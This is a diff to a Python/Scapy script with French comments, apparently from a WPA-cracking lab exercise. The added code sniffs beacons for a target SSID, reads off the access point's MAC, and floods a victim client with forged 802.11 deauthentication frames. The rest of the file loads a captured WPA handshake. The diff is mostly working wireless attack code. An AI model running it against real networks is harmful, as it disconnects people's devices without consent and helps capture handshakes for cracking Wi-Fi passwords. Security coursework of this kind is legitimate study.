@@ -26,13 +26,28 @@ import hmac, hashlib
 # Permet de filtrer les paquetes sniffées et lister les réseaux enregistrées auxquelles les clients tentents de se connecter
 # Paramètre : paquet sniffé qui doit être filtré
 # Remarque : On filtre les paquets par type (0 et 2 - probe request)
+
+def deauth(nbrTime, APmacArg):
+	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=victimMAC,addr2=APmacArg,addr3=APmacArg)/Dot11Deauth(reason=7)
+	for n in range(nbrTime):
+		sendp(packet)
+		print 'Deauth sent via: ' + interface + ' to BSSID: ' + APmacArg + ' for Client: ' + victimMAC
+
 def pkt_callback(pkt):
 	if pkt.type == 0 and pkt.subtype == 8:
-		print(pkt.info)
+		if pkt.info == ssidToHack:
+			APmac = pkt.addr2
+			print "AP MAC: %s" %(pkt.addr2)
+			deauth(100, APmac)
+			return True
+
+
+interface = sys.argv[1]
+ssidToHack = sys.argv[2]
+victimMAC = sys.argv[3]
 
 # Sniff le réseau en fct l'interface et filtres les paquets
-sniff(iface=interface, prn=pkt_callback)
-
+sniff(iface=interface, stop_filter=pkt_callback)
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("wpa_handshake.cap") 
